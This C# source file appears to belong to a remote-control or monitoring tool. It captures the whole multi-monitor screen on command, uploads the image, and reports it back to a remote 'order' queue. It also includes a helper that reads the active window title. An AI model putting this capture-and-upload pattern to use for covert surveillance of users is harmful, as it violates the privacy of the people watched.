using eRemote_V2._0.Hooks;
using eRemote_V2._0.LocalDatabase;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace eRemote_V2._0
{
    class Screenshot
    {

        public static string TakeScreenShot(string key)
        {
            string timeStamp = Lib.GetTimestamp(DateTime.Now);

            var uniqueFileName = $"ss_{timeStamp}_{key}.png";


            ScreenCapture(uniqueFileName);
            return $"./objs/{uniqueFileName}";

        }

        private static void ScreenCapture(string filename)
        {
            // Initialize the virtual screen to dummy values
            int screenLeft = int.MaxValue;
            int screenTop = int.MaxValue;
            int screenRight = int.MinValue;
            int screenBottom = int.MinValue;

            // Enumerate system display devices
            int deviceIndex = 0;
            while (true)
            {
                NativeUtilities.DisplayDevice deviceData = new NativeUtilities.DisplayDevice { cb = Marshal.SizeOf(typeof(NativeUtilities.DisplayDevice)) };
                if (NativeUtilities.EnumDisplayDevices(null, deviceIndex, ref deviceData, 0) != 0)
                {
                    // Get the position and size of this particular display device
                    NativeUtilities.DEVMODE devMode = new NativeUtilities.DEVMODE();
                    if (NativeUtilities.EnumDisplaySettings(deviceData.DeviceName, NativeUtilities.ENUM_CURRENT_SETTINGS, ref devMode))
                    {
                        // Update the virtual screen dimensions
                        screenLeft = Math.Min(screenLeft, devMode.dmPositionX);
                        screenTop = Math.Min(screenTop, devMode.dmPositionY);
                        screenRight = Math.Max(screenRight, devMode.dmPositionX + devMode.dmPelsWidth);
                        screenBottom = Math.Max(screenBottom, devMode.dmPositionY + devMode.dmPelsHeight);
                    }
                    deviceIndex++;
                }
                else
                    break;
            }

            // Create a bitmap of the appropriate size to receive the screen-shot.
            using (Bitmap bmp = new Bitmap(screenRight - screenLeft, screenBottom - screenTop))
            {
                // Draw the screen-shot into our bitmap.
                using (Graphics g = Graphics.FromImage(bmp))
                    g.CopyFromScreen(screenLeft, screenTop, 0, 0, bmp.Size);

                // Stuff the bitmap into a file
                bmp.Save($"./objs/{filename}", ImageFormat.Png);
            }
        }


    

    public static async Task ScreenShotUploader(string ScreenShotPath, string key, string orderId)
        {
            var link = await Uploader.UploadImagesAsync(ScreenShotPath, ScreenShotPath.Replace("./objs/", ""));
            Orders.MarkOrderAsDone(key, orderId, "INSTANT_SCREEN", link);
        }



        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();


        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        private static string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return null;
        }
    }
}
